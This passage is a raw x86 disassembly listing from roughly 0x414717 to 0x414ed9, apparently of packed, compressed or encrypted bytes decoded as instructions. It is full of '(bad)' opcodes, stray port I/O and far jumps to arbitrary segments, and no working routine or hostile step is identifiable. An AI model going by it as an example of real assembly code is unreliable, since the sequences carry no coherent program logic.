  414717:	jno    0x4146a0
  414719:	push   ss
  41471a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41471b:	iret   
  41471c:	rcr    bl,1
  41471e:	into   
  41471f:	(bad)  
  414720:	fwait
  414721:	sub    al,0xef
  414723:	sbb    DWORD PTR [edi],esi
  414725:	sub    ch,bl
  414727:	ja     0x4146bc
  414729:	imul   dh
  41472b:	jne    0x4146dd
  41472d:	dec    edx
  41472e:	push   0x531c0cc6
  414733:	jp     0x414781
  414735:	std    
  414736:	popf   
  414737:	shl    ebp,1
  414739:	mov    bl,0xfd
  41473b:	jo     0x414703
  41473d:	stos   BYTE PTR es:[edi],al
  41473e:	xor    esp,DWORD PTR [esi+0x7133b864]
  414744:	add    ecx,DWORD PTR [ecx]
  414746:	mov    eax,ds:0x1948ca1
  41474b:	cld    
  41474c:	loop   0x414726
  41474e:	mov    ebx,0x955cf668
  414753:	jbe    0x4147c6
  414755:	push   ebx
  414756:	pop    esp
  414757:	inc    edi
  414758:	rcr    BYTE PTR [esi],cl
  41475a:	jp     0x4146e6
  41475c:	mov    ebp,0x1d7059b
  414761:	popf   
  414762:	dec    esi
  414763:	or     eax,DWORD PTR [ecx]
  414765:	test   eax,0x35a1f5c5
  41476a:	dec    esp
  41476b:	ds jb  0x41474c
  41476e:	cld    
  41476f:	clc    
  414770:	jne    0x4147e1
  414772:	inc    ebp
  414773:	inc    edx
  414774:	mul    ah
  414776:	retf   0x4bfb
  414779:	xchg   ebp,ecx
  41477b:	mov    bl,BYTE PTR [ecx]
  41477d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41477e:	rol    ebp,1
  414780:	xchg   BYTE PTR [ebx+ebx*4],ch
  414783:	xchg   esp,eax
  414784:	mov    eax,0x676a45fb
  414789:	fsubr  QWORD PTR [ecx-0x62]
  41478c:	stos   BYTE PTR es:[edi],al
  41478d:	mov    WORD PTR [ecx+ecx*1-0x42],cs
  414791:	cmp    edi,edi
  414793:	mov    ebp,eax
  414795:	xchg   esi,eax
  414796:	dec    edx
  414797:	enter  0x8973,0xa7
  41479b:	mov    bl,0xa5
  41479d:	daa    
  41479e:	sub    BYTE PTR ds:0x296a034c,al
  4147a4:	dec    eax
  4147a5:	scas   al,BYTE PTR es:[edi]
  4147a6:	add    BYTE PTR [edi+0x8],al
  4147a9:	je     0x41477d
  4147ab:	pusha  
  4147ac:	xchg   esi,eax
  4147ad:	jmp    0x8de0:0x7bca753
  4147b4:	inc    edi
  4147b5:	mov    ds:0x3d4f7c00,eax
  4147ba:	imul   esp,esp,0x68
  4147bd:	add    DWORD PTR ds:0xbbd2a575,eax
  4147c3:	popf   
  4147c4:	mov    ch,0x15
  4147c6:	es push esi
  4147c8:	loope  0x414767
  4147ca:	lahf   
  4147cb:	xor    al,0x61
  4147cd:	xor    bl,bl
  4147cf:	add    bh,bl
  4147d1:	jo     0x414755
  4147d3:	or     esi,ecx
  4147d5:	in     eax,0xd9
  4147d7:	push   esp
  4147d8:	leave  
  4147d9:	cld    
  4147da:	jmp    0x9548:0xca2d42a2
  4147e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4147e2:	sbb    eax,DWORD PTR [eax-0x1a]
  4147e5:	imul   ebx,DWORD PTR [ebp-0x357b42f1],0xff2fdad1
  4147ef:	and    ecx,esp
  4147f1:	add    edi,DWORD PTR [eax+0x6]
  4147f4:	push   esp
  4147f5:	pop    esi
  4147f6:	dec    edx
  4147f7:	add    eax,0xa2d4ce25
  4147fc:	jo     0x41483b
  4147fe:	das    
  4147ff:	test   BYTE PTR [edi+0x5d],0x6d
  414803:	div    BYTE PTR [eax]
  414805:	cli    
  414806:	sub    ah,BYTE PTR [ebx+0x62dda617]
  41480c:	jmp    0x41480b
  41480e:	out    0xa,eax
  414810:	jb     0x414837
  414812:	push   ds
  414813:	pop    es
  414814:	sti    
  414815:	and    al,0xe6
  414817:	push   esi
  414818:	jne    0x4147f7
  41481a:	and    al,0x7
  41481c:	inc    esi
  41481d:	stos   BYTE PTR es:[edi],al
  41481e:	cmp    BYTE PTR [eax+0x20],al
  414821:	pushf  
  414822:	add    BYTE PTR [ebx],ah
  414824:	cwde   
  414825:	sbb    BYTE PTR [edx+ebp*1],dl
  414828:	mov    dh,0xb0
  41482a:	xchg   ebx,eax
  41482b:	mov    dh,0x8e
  41482d:	push   eax
  41482e:	stc    
  41482f:	ret    
  414830:	int3   
  414831:	adc    ebp,DWORD PTR [ebx]
  414833:	sub    DWORD PTR [ebx+0x634ab770],ecx
  414839:	mov    ds:0xf3a22751,al
  41483e:	test   al,0x89
  414840:	cmp    eax,ebx
  414842:	(bad)  
  414843:	cli    
  414844:	mov    ecx,0x5c02ed2
  414849:	add    DWORD PTR gs:[edi],0xffffffb7
  41484d:	or     dl,dl
  41484f:	ins    DWORD PTR es:[edi],dx
  414850:	(bad)  
  414851:	lea    edi,[ebx+0x36]
  414854:	push   0x49
  414856:	lods   al,BYTE PTR ds:[esi]
  414857:	push   es
  414858:	push   ss
  414859:	sbb    al,ah
  41485b:	dec    esi
  41485d:	sub    BYTE PTR [ebx],bl
  41485f:	aaa    
  414860:	loop   0x4147f2
  414862:	call   0xd5fd:0xeff6fbc6
  414869:	faddp  st(3),st
  41486b:	mov    cl,0xc8
  41486d:	mov    al,0xcd
  41486f:	mov    edi,0x889b4632
  414874:	(bad)
  414877:	imul   edi,DWORD PTR [eax-0x4b],0x6
  41487b:	sti    
  41487c:	mov    esi,0x3c8b8c62
  414881:	adc    BYTE PTR [edx+0x4d],dh
  414884:	cld    
  414885:	add    al,BYTE PTR [edi]
  414887:	jge    0x41480e
  414889:	test   DWORD PTR [ebx],0xcffa37f9
  41488f:	aam    0x51
  414891:	pop    edi
  414892:	or     DWORD PTR [esi+0x52],ebx
  414895:	cmp    al,BYTE PTR [edi]
  414897:	out    dx,eax
  414898:	sahf   
  414899:	pop    ebx
  41489a:	inc    ebp
  41489b:	fst    QWORD PTR ds:0xfe0e13e9
  4148a1:	and    eax,0xff2d7669
  4148a6:	cld    
  4148a7:	xor    al,BYTE PTR [edx+0x2cd98b43]
  4148ad:	leave  
  4148ae:	or     al,0x56
  4148b0:	dec    edx
  4148b1:	mov    dl,0xb3
  4148b3:	pop    es
  4148b4:	xchg   DWORD PTR [ecx],ecx
  4148b6:	(bad)  
  4148b7:	or     DWORD PTR [di],eax
  4148ba:	ret    0x9681
  4148bd:	ja     0x414927
  4148bf:	mov    al,0x30
  4148c1:	cmp    ah,bh
  4148c3:	xchg   BYTE PTR [esi-0x1f],dh
  4148c6:	je     0x4148b7
  4148c8:	fist   WORD PTR [edx]
  4148ca:	jne    0x4148f7
  4148cc:	aas    
  4148cd:	and    esi,edx
  4148cf:	mov    ecx,0x57aeb25d
  4148d4:	push   ds
  4148d5:	(bad)  
  4148d6:	push   esi
  4148d7:	dec    ebp
  4148d8:	rcr    BYTE PTR [ebp+edi*1-0x4a0eaa9c],0xcf
  4148e0:	cli    
  4148e1:	shl    BYTE PTR [eax+0x2d096e2c],1
  4148e7:	test   edx,edx
  4148e9:	pop    edx
  4148ea:	push   ebp
  4148eb:	mov    esi,0x80856cbc
  4148f0:	repnz call 0x6cc5:0x831fe031
  4148f8:	test   BYTE PTR [edi-0x5b65c7e3],0xc2
  4148ff:	or     bl,BYTE PTR [eax-0x77fae0ba]
  414905:	push   esp
  414906:	out    0x7a,al
  414908:	imul   ecx,DWORD PTR [bp+si+0x2e7c],0x63
  41490e:	push   es
  41490f:	in     eax,0xc1
  414911:	in     al,0x7
  414913:	mov    edx,0x1acbfcde
  414918:	jno    0x414927
  41491a:	pop    esi
  41491b:	sub    esi,DWORD PTR [edx+0x70934dc1]
  414921:	fadd   DWORD PTR [ebx+0x1b481fb5]
  414927:	mov    BYTE PTR [ebx],dh
  414929:	push   edx
  41492a:	jb     0x41494f
  41492c:	jo     0x4148f4
  41492e:	(bad)  
  41492f:	aaa    
  414930:	sbb    al,BYTE PTR [ebx]
  414932:	(bad)  
  414933:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414934:	mov    ds:0x518ab29f,eax
  414939:	mov    cl,0x7c
  41493b:	je     0x41499f
  41493d:	fild   WORD PTR [ebp+0x124555b1]
  414943:	or     ah,BYTE PTR [ecx]
  414945:	cmp    bh,BYTE PTR [eax-0x4c9333af]
  41494b:	ds cld 
  41494d:	inc    ebp
  41494e:	and    bh,dh
  414950:	pop    edi
  414951:	or     esi,ebx
  414953:	sub    edi,DWORD PTR ds:0xec840e10
  414959:	sbb    esp,ebx
  41495b:	cdq    
  41495c:	in     al,0x2c
  41495e:	pop    esp
  41495f:	dec    ebp
  414960:	inc    edi
  414961:	data16 cmc 
  414963:	int    0xa6
  414965:	daa    
  414966:	rol    eax,0xc5
  414969:	ja     0x41493d
  41496b:	lea    edi,[edi-0x44]
  41496e:	mov    eax,0x84f7df92
  414973:	adc    al,0xfe
  414975:	adc    al,0x41
  414977:	loopne 0x4149f1
  414979:	jp     0x414931
  41497b:	push   cs
  41497c:	and    eax,0xd01e0354
  414981:	push   ebx
  414982:	call   0x9c205082
  414987:	mov    edx,edi
  414989:	fs iret 
  41498b:	cmp    esi,edi
  41498d:	call   0x5454:0xf8bf459d
  414994:	cli    
  414995:	stos   BYTE PTR es:[edi],al
  414996:	sti    
  414997:	ret    0x2b6e
  41499a:	pop    esi
  41499b:	out    dx,al
  41499c:	into   
  41499d:	cdq    
  41499e:	(bad)  
  41499f:	cmp    BYTE PTR [ecx-0x2d02c9a7],bl
  4149a5:	popf   
  4149a6:	xlat   BYTE PTR ds:[ebx]
  4149a7:	mov    esp,0x83759d2f
  4149ac:	fucomip st,st(7)
  4149ae:	jmp    0x5bf6:0x57d981fa
  4149b5:	pop    esi
  4149b6:	sti    
  4149b7:	and    ebp,DWORD PTR [edi+0x37]
  4149ba:	cmp    eax,0xe39aeb9c
  4149bf:	cwde   
  4149c0:	pop    edx
  4149c1:	test   DWORD PTR [ecx-0x40],edi
  4149c4:	pushf  
  4149c5:	xor    DWORD PTR [ebx+eiz*8+0x79468895],0xb4ff3cef
  4149d0:	push   esi
  4149d1:	dec    DWORD PTR [ebx+0x27d4d8bd]
  4149d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4149d8:	dec    ecx
  4149d9:	mov    ds:0x3ef64f47,eax
  4149de:	dec    ax
  4149e0:	pop    ecx
  4149e1:	push   eax
  4149e2:	neg    DWORD PTR [eax-0x72]
  4149e5:	popf   
  4149e6:	sub    BYTE PTR [ecx+0x4ebc289d],0xcd
  4149ed:	and    eax,0x52edc63c
  4149f2:	mov    eax,ds:0xe028f699
  4149f7:	sbb    DWORD PTR [ecx-0x64],0xffffff88
  4149fb:	fcomip st,st(7)
  4149fd:	jge    0x4149bf
  4149ff:	sbb    al,0x6f
  414a01:	and    eax,0xbcb5a767
  414a06:	mov    esp,DWORD PTR [ebp+0x7eb7c38c]
  414a0c:	clc    
  414a0d:	test   DWORD PTR [edx+0x2c017647],ebp
  414a13:	pop    ss
  414a14:	stos   BYTE PTR es:[edi],al
  414a15:	aad    0xf5
  414a17:	cmp    DWORD PTR [eax-0x497b8e1f],edi
  414a1d:	fidiv  DWORD PTR [esi-0x459c10be]
  414a23:	cmp    al,0x7b
  414a25:	js     0x414a55
  414a27:	jle    0x4149c5
  414a29:	cmp    BYTE PTR [esi-0x24c330d1],dh
  414a2f:	adc    al,0xd2
  414a31:	nop
  414a32:	add    al,0xdf
  414a34:	jmp    0x414a8b
  414a36:	(bad)  
  414a37:	push   DWORD PTR [ecx]
  414a39:	aas    
  414a3a:	push   esp
  414a3b:	loope  0x414a1b
  414a3d:	ss out dx,al
  414a3f:	cmc    
  414a40:	mov    ebp,0x1a73ae87
  414a45:	int    0x2f
  414a47:	(bad)  
  414a48:	or     ecx,DWORD PTR [ecx-0x3b9d2792]
  414a4e:	aam    0xe1
  414a50:	mov    ebp,DWORD PTR [ebx]
  414a52:	add    eax,0x1b20b626
  414a57:	mov    dh,0x11
  414a59:	cmp    al,ah
  414a5b:	xor    al,0x61
  414a5d:	adc    BYTE PTR [ebx+eiz*8-0x759df2f],cl
  414a64:	cmp    dl,ch
  414a66:	add    ecx,DWORD PTR [ebx]
  414a68:	mov    ss,edx
  414a6a:	fnstenv cs:[eax-0x515456d0]
  414a71:	rcr    BYTE PTR [edi+0x47f4abb1],1
  414a77:	and    ch,BYTE PTR [edx+0x4f]
  414a7a:	and    DWORD PTR [esi+0x125c56c],ebx
  414a80:	(bad)  
  414a81:	or     BYTE PTR [edi],al
  414a83:	(bad)  
  414a84:	jmp    0x414a92
  414a86:	jnp    0x414ad7
  414a88:	sahf   
  414a89:	mov    bl,0x97
  414a8b:	push   edi
  414a8c:	aas    
  414a8d:	cwde   
  414a8e:	aad    0x7d
  414a90:	mov    ds:0xe069bfc3,al
  414a95:	dec    edx
  414a96:	retf   0x5752
  414a99:	and    al,0xd
  414a9b:	aas    
  414a9c:	mov    DWORD PTR [edx+0x31],ebp
  414a9f:	mov    ?,WORD PTR [ecx+ebp*2-0x46]
  414aa3:	mov    esi,0x6f170c4f
  414aa8:	(bad)  [esi-0x66]
  414aab:	aam    0x18
  414aad:	dec    ecx
  414aae:	inc    esp
  414aaf:	xor    edx,0xe2d303f7
  414ab5:	gs mov dl,0xfb
  414ab8:	mov    ?,edx
  414aba:	pop    ebx
  414abb:	lods   eax,DWORD PTR ds:[esi]
  414abc:	fnsave [ecx+eax*1-0x2ff143cf]
  414ac3:	repnz int 0xdd
  414ac6:	in     eax,dx
  414ac7:	(bad)  
  414ac8:	neg    BYTE PTR [ebx+0x5b]
  414acb:	push   esi
  414acc:	or     al,0x6a
  414ace:	cs jbe 0x414b4b
  414ad1:	lods   al,BYTE PTR ds:[esi]
  414ad2:	inc    ebx
  414ad3:	jl     0x414a73
  414ad5:	dec    eax
  414ad6:	shl    BYTE PTR [ebp-0x2e],cl
  414ad9:	in     eax,dx
  414ada:	inc    edi
  414adb:	mov    eax,ds:0xed001681
  414ae0:	in     al,0xc2
  414ae2:	div    bl
  414ae4:	pop    eax
  414ae5:	ja     0x414a84
  414ae7:	push   cs
  414ae8:	pop    ebp
  414ae9:	jns    0x414b27
  414aeb:	or     edx,DWORD PTR [edx+eiz*4+0x6c2f9a28]
  414af2:	inc    ebx
  414af3:	xor    edx,DWORD PTR [ebp+edx*4+0x6f]
  414af7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414af8:	ds jl  0x414af6
  414afb:	xchg   edx,eax
  414afc:	jmp    0xfb0bd276
  414b01:	mov    edi,0x7203482f
  414b06:	fdiv   QWORD PTR ds:0xbc876e27
  414b0c:	xor    edx,DWORD PTR [ebx]
  414b0e:	stc    
  414b0f:	pop    edx
  414b10:	jle    0x414ad5
  414b12:	jmp    0xc70b:0x3f7c383f
  414b19:	retf   0x6f67
  414b1c:	sub    ah,BYTE PTR [eax+0x7e]
  414b1f:	out    dx,eax
  414b20:	js     0x414ac3
  414b22:	fwait
  414b23:	add    eax,0x4ac9cfd1
  414b28:	nop
  414b29:	outs   dx,DWORD PTR ds:[esi]
  414b2a:	mov    edx,0x61892772
  414b2f:	outs   dx,DWORD PTR ds:[esi]
  414b30:	hlt    
  414b31:	jo     0x414b58
  414b33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b34:	inc    edx
  414b35:	arpl   bx,sp
  414b37:	nop
  414b38:	gs stc 
  414b3a:	mov    edi,0x3c16a64f
  414b3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b40:	pop    esi
  414b41:	arpl   WORD PTR [esi],cx
  414b43:	sbb    ax,0xf4f8
  414b47:	ret    0x335c
  414b4a:	xchg   edi,eax
  414b4b:	lahf   
  414b4c:	in     al,0xfc
  414b4e:	sbb    al,0x50
  414b50:	add    al,0x25
  414b52:	imul   ebx,edx,0xbc8274a7
  414b58:	aas    
  414b59:	cld    
  414b5a:	(bad)  
  414b5b:	adc    dl,BYTE PTR [ebx+0x287516c2]
  414b61:	in     eax,0x88
  414b63:	cmc    
  414b64:	adc    BYTE PTR ds:0x83c7e7d1,0x6d
  414b6b:	dec    ecx
  414b6c:	adc    DWORD PTR ss:[edx+ebp*4-0x78],esi
  414b71:	or     edx,edx
  414b73:	fsubrp st(4),st
  414b75:	dec    esi
  414b76:	imul   ch
  414b78:	das    
  414b79:	loop   0x414afc
  414b7b:	(bad)  
  414b7c:	out    dx,al
  414b7d:	out    dx,eax
  414b7e:	xchg   esp,eax
  414b7f:	pop    edx
  414b80:	mov    cs,WORD PTR [ebp-0x74f4ae41]
  414b86:	cmp    dh,BYTE PTR cs:0xfd5e0e16
  414b8d:	xchg   DWORD PTR [esp+ecx*2],ebp
  414b90:	das    
  414b91:	std    
  414b92:	dec    esp
  414b93:	dec    ebx
  414b94:	or     esp,DWORD PTR [ebp-0x1f]
  414b97:	jmp    0xe0ef1cd4
  414b9c:	out    dx,eax
  414b9d:	jmp    0x414bea
  414b9f:	rcl    BYTE PTR [edi+0x56],0x43
  414ba3:	sub    DWORD PTR [ebx+edx*4-0x69],esi
  414ba7:	push   ss
  414ba8:	addr16 lahf 
  414baa:	push   eax
  414bab:	mov    al,ch
  414bad:	jmp    0x2974ebf8
  414bb2:	jg     0x414b4a
  414bb4:	fwait
  414bb5:	xor    ecx,DWORD PTR [ecx+0x6d]
  414bb8:	push   ds
  414bb9:	pop    ecx
  414bba:	inc    esi
  414bbb:	adc    al,0x6e
  414bbd:	xor    BYTE PTR [ebx-0x2ff7f07a],ch
  414bc3:	inc    ebp
  414bc4:	cs push esi
  414bc6:	sbb    cl,BYTE PTR [ebx+ebp*1+0x5b]
  414bca:	sar    DWORD PTR [eax-0x48d526ed],cl
  414bd0:	test   BYTE PTR [esi-0x9],cl
  414bd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414bd4:	sbb    edx,DWORD PTR [ebx-0x14]
  414bd7:	lods   eax,DWORD PTR ds:[esi]
  414bd8:	test   DWORD PTR gs:[edx+0x413f5e3e],esi
  414bdf:	mov    WORD PTR [esi+0x14858fb4],fs
  414be5:	test   BYTE PTR [edx+edi*8-0x72cc5bf6],0x29
  414bed:	jnp    0x414c11
  414bef:	faddp  st(0),st
  414bf1:	pop    ebp
  414bf2:	xchg   DWORD PTR [eax],ebx
  414bf4:	mov    ebx,0x1aedd51a
  414bf9:	stos   BYTE PTR es:[edi],al
  414bfa:	sbb    esi,DWORD PTR [ebp+0x63]
  414bfd:	iret   
  414bfe:	or     bh,BYTE PTR [edx+ecx*1+0x2eb940be]
  414c05:	dec    edx
  414c06:	and    eax,DWORD PTR gs:[ecx+0x3e9870d]
  414c0d:	stc    
  414c0e:	ins    DWORD PTR es:[edi],dx
  414c0f:	rcl    DWORD PTR [esi],cl
  414c11:	add    DWORD PTR [esi+0x6e],ecx
  414c14:	out    0x95,al
  414c16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c17:	mov    eax,ds
  414c19:	mov    bh,0xad
  414c1b:	repz enter 0x32ca,0x9a
  414c20:	mov    WORD PTR [edi],cs
  414c22:	xchg   ebx,eax
  414c23:	(bad)  
  414c24:	cmp    edx,DWORD PTR [ecx]
  414c26:	dec    ecx
  414c27:	add    eax,0xcd7cc977
  414c2c:	and    eax,DWORD PTR [edi+0x5e3c9157]
  414c32:	stos   BYTE PTR es:[edi],al
  414c33:	cs mov esp,0x5903ace9
  414c39:	mov    eax,0xd2bde4d
  414c3e:	test   BYTE PTR [eax],bh
  414c40:	dec    edx
  414c41:	ret    
  414c42:	stc    
  414c43:	mov    al,0xd3
  414c45:	ret    
  414c46:	sub    esp,DWORD PTR [esi]
  414c48:	cmp    ebp,ebx
  414c4a:	add    al,0x7c
  414c4c:	cmp    eax,DWORD PTR [ecx-0x100e5dd1]
  414c52:	pop    edi
  414c53:	dec    ebp
  414c54:	adc    eax,0xcfdd9386
  414c59:	sub    cl,bl
  414c5b:	(bad)  
  414c5c:	in     al,dx
  414c5d:	inc    eax
  414c5e:	xor    esp,DWORD PTR [ebx+ebp*8-0x1c]
  414c62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c63:	test   al,0x9d
  414c65:	in     eax,0x74
  414c67:	test   ecx,edi
  414c69:	sbb    eax,0xc47cea71
  414c6e:	inc    ecx
  414c6f:	leave  
  414c70:	sub    eax,0xbcd63bb9
  414c75:	inc    ebp
  414c76:	fdiv   QWORD PTR [edi]
  414c78:	(bad)  
  414c79:	adc    al,BYTE PTR [eax+edi*2+0x35]
  414c7d:	daa    
  414c7e:	and    DWORD PTR ds:0x854f5225,eax
  414c84:	cld    
  414c85:	mov    WORD PTR [edi+0x396ff0f5],ss
  414c8b:	jns    0x414cac
  414c8d:	add    cl,BYTE PTR [ecx*1+0x4bd6019c]
  414c94:	test   ecx,ebp
  414c96:	popa   
  414c97:	fdiv   DWORD PTR [ebx]
  414c99:	cld    
  414c9a:	test   al,0xf1
  414c9c:	shl    BYTE PTR [eax],cl
  414c9e:	call   0x9583:0xaecd00df
  414ca5:	or     BYTE PTR [ecx-0x2a017904],al
  414cab:	mov    bh,0x3d
  414cad:	xchg   esi,eax
  414cae:	jo     0x414c8c
  414cb0:	aas    
  414cb1:	add    dh,dl
  414cb3:	or     eax,0xa5d46bb5
  414cb8:	shr    DWORD PTR [ecx+0x39],0x50
  414cbc:	call   0xdc05:0xeffc0569
  414cc3:	in     eax,0xcb
  414cc5:	mov    WORD PTR [eax],?
  414cc7:	aas    
  414cc8:	sbb    al,0x39
  414cca:	xor    edi,DWORD PTR ds:0xc31c21ce
  414cd0:	ja     0x414c85
  414cd2:	repnz pop edx
  414cd4:	int    0xfa
  414cd6:	popf   
  414cd7:	ins    DWORD PTR es:[edi],dx
  414cd8:	sbb    ebp,DWORD PTR [edi]
  414cda:	pop    ecx
  414cdc:	cs pop ss
  414cde:	addr16 inc edi
  414ce0:	scas   eax,DWORD PTR es:[edi]
  414ce1:	aam    0xd2
  414ce3:	jb     0x414cd7
  414ce5:	addr16 ret 0x47bc
  414ce9:	in     eax,0xfe
  414ceb:	test   BYTE PTR [eax+0x71],dh
  414cee:	in     eax,0x84
  414cf0:	aad    0x73
  414cf2:	fisttp DWORD PTR [edi]
  414cf4:	loopne 0x414d6f
  414cf6:	repnz (bad) 
  414cf8:	rcl    DWORD PTR [eax+ecx*1+0x2f069833],cl
  414cff:	cmp    al,0x5f
  414d01:	pop    si
  414d03:	or     dh,BYTE PTR [eax]
  414d05:	xchg   esp,eax
  414d06:	jg     0x414c9c
  414d08:	and    BYTE PTR [ebx+0x17a7a6f],bl
  414d0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d0f:	pop    ebp
  414d10:	or     ebp,DWORD PTR [edi+0x3e]
  414d13:	pop    ds
  414d14:	mov    WORD PTR [edx+ebx*2-0x47f13f49],ds
  414d1b:	into   
  414d1c:	cmp    al,0x15
  414d1e:	iret   
  414d1f:	popf   
  414d20:	js     0x414cfb
  414d22:	into   
  414d23:	in     al,dx
  414d24:	addr16 pop edi
  414d26:	popa   
  414d27:	retf   
  414d28:	push   0x57
  414d2a:	jmp    0x2f1fc5f4
  414d2f:	mov    ch,0x9c
  414d31:	call   0x372a:0x5faec0a0
  414d38:	enter  0x7cf1,0x2c
  414d3c:	dec    esi
  414d3d:	arpl   WORD PTR [edi],dx
  414d3f:	mov    ds:0xbaf139ea,eax
  414d44:	ret    0x7729
  414d47:	adc    edi,DWORD PTR [edx+0x277feaa1]
  414d4d:	call   0x2429ae8c
  414d52:	js     0x414d08
  414d54:	retf   
  414d55:	mov    ds:0x4fedbc,al
  414d5a:	lods   eax,DWORD PTR ds:[esi]
  414d5b:	lea    sp,[edi]
  414d5e:	enter  0xbc28,0x0
  414d62:	js     0x414d85
  414d64:	adc    al,0xdf
  414d66:	pushf  
  414d67:	mov    dl,0xf5
  414d69:	cmp    DWORD PTR [edx],ebx
  414d6b:	push   edx
  414d6c:	not    ecx
  414d6e:	xor    DWORD PTR [ebp+0x5],esp
  414d71:	add    bl,dh
  414d73:	(bad)
  414d76:	xor    DWORD PTR [ebx],ebp
  414d78:	stc    
  414d79:	sub    esi,DWORD PTR [ecx-0x17cd5975]
  414d7f:	pop    ecx
  414d80:	test   al,0x4a
  414d82:	loope  0x414d7b
  414d84:	or     DWORD PTR [ecx-0x61],ebp
  414d87:	cmp    eax,0xc124cda6
  414d8c:	mov    esp,?
  414d8e:	lock mov edx,0x149dfda4
  414d94:	lds    esi,FWORD PTR [ebp-0x6e081d1f]
  414d9a:	xchg   edx,eax
  414d9b:	adc    bh,bl
  414d9d:	div    BYTE PTR [ecx+eax*1+0x3b]
  414da1:	mov    ch,0xaa
  414da3:	mov    edx,0xb69f6539
  414da8:	cmp    DWORD PTR [eax+0x2b],ecx
  414dab:	mov    ds:0x19e8ab10,eax
  414db0:	sar    BYTE PTR [edx+0x4e],1
  414db3:	xchg   ebx,eax
  414db4:	fistp  WORD PTR [edi+0x6c5ce850]
  414dba:	ins    DWORD PTR es:[edi],dx
  414dbb:	jl     0x414d80
  414dbd:	(bad)  
  414dbe:	data16 fistp DWORD PTR [eax+eiz*1]
  414dc2:	mov    esp,cs
  414dc4:	sbb    al,dh
  414dc6:	cmp    dl,BYTE PTR [edx]
  414dc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414dc9:	sbb    esi,edi
  414dcb:	add    DWORD PTR [edx],eax
  414dcd:	cld    
  414dce:	data16 cli 
  414dd0:	and    eax,0x784d83a5
  414dd5:	fist   DWORD PTR [ebp+0x13]
  414dd8:	(bad)  
  414dd9:	rcr    BYTE PTR [edx],cl
  414ddb:	cmp    ebp,ecx
  414ddd:	sar    BYTE PTR [eax+esi*8-0x7794c917],cl
  414de4:	or     cl,BYTE PTR [esi-0x36dee5e4]
  414dea:	ins    BYTE PTR es:[edi],dx
  414deb:	daa    
  414dec:	lods   eax,DWORD PTR ds:[esi]
  414ded:	sub    bl,BYTE PTR [ebx-0xa]
  414df0:	out    0x71,eax
  414df2:	lea    esp,[ebx]
  414df4:	add    al,0x75
  414df6:	aad    0x15
  414df8:	(bad)  
  414df9:	mov    al,0xa9
  414dfb:	stos   DWORD PTR es:[edi],eax
  414dfc:	add    ebp,esp
  414dfe:	inc    edi
  414dff:	rcr    BYTE PTR [esi+ebx*2],0x85
  414e03:	clc    
  414e04:	imul   edi,DWORD PTR [edx],0xc5f7a875
  414e0a:	sbb    ebp,edx
  414e0c:	pop    ds
  414e0d:	push   eax
  414e0e:	loopne 0x414dee
  414e10:	sbb    edx,esp
  414e12:	loop   0x414dbf
  414e14:	cmp    BYTE PTR [ecx-0x48da4007],dl
  414e1a:	addr16 int 0xee
  414e1d:	mov    dl,0xbd
  414e1f:	ja     0x414e6a
  414e21:	and    ch,BYTE PTR [esi+0x681f077d]
  414e27:	mov    ebp,ebx
  414e29:	mov    bh,0x44
  414e2b:	lods   al,BYTE PTR ds:[esi]
  414e2c:	sbb    ch,cl
  414e2e:	pop    eax
  414e2f:	in     eax,dx
  414e30:	dec    ecx
  414e31:	pushf  
  414e32:	adc    eax,0x8913bc8c
  414e37:	mov    cl,0x96
  414e39:	xlat   BYTE PTR ds:[ebx]
  414e3a:	push   esp
  414e3b:	addr16 pop ds
  414e3d:	sub    DWORD PTR [edi+0x30],ebp
  414e40:	or     eax,0x4b1024f2
  414e45:	fwait
  414e46:	sbb    al,BYTE PTR ds:0x5d6c0b59
  414e4c:	pop    edi
  414e4d:	pop    ebp
  414e4e:	add    ah,BYTE PTR [edx+0x2e30d4ed]
  414e54:	loope  0x414e6f
  414e56:	jmp    0x414def
  414e58:	push   ebp
  414e59:	aaa    
  414e5a:	jmp    0x414eb6
  414e5c:	sub    BYTE PTR [ebx],0x61
  414e5f:	and    eax,0xb0871ec4
  414e64:	dec    esi
  414e65:	mov    cl,BYTE PTR [edx-0x4963ca77]
  414e6b:	sahf   
  414e6c:	mov    eax,ds:0x958f22a0
  414e71:	not    BYTE PTR [ebp-0x55]
  414e74:	cmp    BYTE PTR [esi],ch
  414e76:	sahf   
  414e77:	adc    bl,BYTE PTR [edi+eiz*2]
  414e7a:	je     0x414e5b
  414e7c:	cmp    al,0xd2
  414e7e:	mov    ah,0x12
  414e80:	imul   eax,DWORD PTR [esp+ebx*8],0xffffffa2
  414e84:	and    al,BYTE PTR [edx+0x60]
  414e87:	popa   
  414e88:	push   es
  414e89:	adc    ecx,edx
  414e8b:	(bad)  
  414e8c:	mov    ah,0x6c
  414e8e:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  414e90:	gs cli 
  414e92:	or     DWORD PTR [ebx-0x23adb955],esp
  414e98:	pop    ebx
  414e9a:	lods   al,BYTE PTR ds:[esi]
  414e9b:	sbb    bl,0x4f
  414e9e:	sub    dl,BYTE PTR ds:0xea581138
  414ea4:	mov    BYTE PTR [edx+0x2d5e9502],0x7a
  414eab:	neg    DWORD PTR [ebp-0x53dcfb01]
  414eb1:	dec    esi
  414eb2:	mov    bh,0xe5
  414eb4:	mov    dl,0x6f
  414eb6:	fistp  QWORD PTR [eax]
  414eb8:	jmp    FWORD PTR ds:[ebx]
  414ebb:	or     al,0xa8
  414ebd:	adc    al,0x3b
  414ebf:	push   edx
  414ec0:	mov    bh,0x76
  414ec2:	popa   
  414ec3:	push   ebp
  414ec4:	mov    bh,0xe8
  414ec6:	mov    al,0x4d
  414ec8:	mov    edx,0x97ac1acb
  414ecd:	das    
  414ece:	mov    ecx,0xa2c70e51
  414ed3:	inc    edx
  414ed4:	jmp    DWORD PTR [ebp-0x4f]
  414ed7:	loopne 0x414e7f
  414ed9:	pop    edi
